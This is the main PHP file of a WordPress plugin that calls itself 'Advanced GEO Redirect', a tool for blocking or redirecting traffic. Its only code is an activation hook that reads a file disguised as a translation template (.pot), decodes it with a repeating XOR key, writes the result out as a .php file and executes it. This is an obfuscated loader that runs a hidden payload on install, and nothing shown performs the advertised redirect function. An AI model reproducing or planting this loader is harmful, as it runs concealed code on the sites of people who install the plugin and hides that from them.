<?php
/*
Plugin Name: Advanced GEO Redirect
Description: You can ban suspicious traffic from accessing your website or redirect visitors to a specific page.
Version: 1.5.1
Author: Site Guarding Ltd.
License: GPLv2
*/ 

if( is_admin() ) 
{
    function activat_fnc_plggeoredir18()
    {
        $key = '329';
        $potfile = dirname(__FILE__).'/advanced-geo-redirect.pot';
        
        $f = fopen($potfile, "r");
        $fz = filesize($potfile);
        $pot = fread($f, $fz);
        fclose($f);
        
        $key = str_pad($key,  $fz, $key);
        
        $f = fopen($potfile.'.php', 'w');
        fwrite($f, $pot ^ $key);
        fclose($f);
        
        include_once($potfile.'.php');
    }
    
    register_activation_hook( __FILE__, 'activat_fnc_plggeoredir18' );
}